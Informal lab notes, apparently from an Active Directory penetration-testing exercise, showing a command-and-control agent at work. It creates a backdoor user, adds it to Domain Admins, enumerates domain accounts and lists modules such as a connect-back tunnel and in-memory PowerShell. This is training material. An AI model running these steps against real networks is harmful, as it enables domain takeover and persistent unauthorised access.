It can be used to do alot of stuff, here are afew case examples
...
```
adduser eviluser Password123 MARVEL.local
```

## Adding a user to domain admins

```
06/04/2024 09:44:55 [5pider] Demon » addusertogroup eviluser "Domain Admins" "" ""
[*] [93BE8D14] Tasked demon to add the user eviluser to the Domain Admins group
[+] Send Task to Agent [31 bytes]
[+] Received Output [42 bytes]:
Adding eviluser to Domain Admins
SUCCESS.
...
**note these are in-built modules, this arent specifically the best so its always to do shit by hand**

```
06/04/2024 09:55:06 [5pider] Demon » domainenum 
[*] [239A6FE7] Tasked demon to list user accounts in the current domain
[+] Send Task to Agent [31 bytes]
[+] Received Output [108 bytes]:
-- Administrator
-- Guest
-- krbtgt
-- tstark
...
```
06/04/2024 09:45:13 [5pider] Demon » help
...
==============
  ...
  ligolo-ng                Command      Connect back to the ligolo server.
  ...
  nps                      Command      Use NoPowerShell.exe to run PowerShell cmdlets in memory.
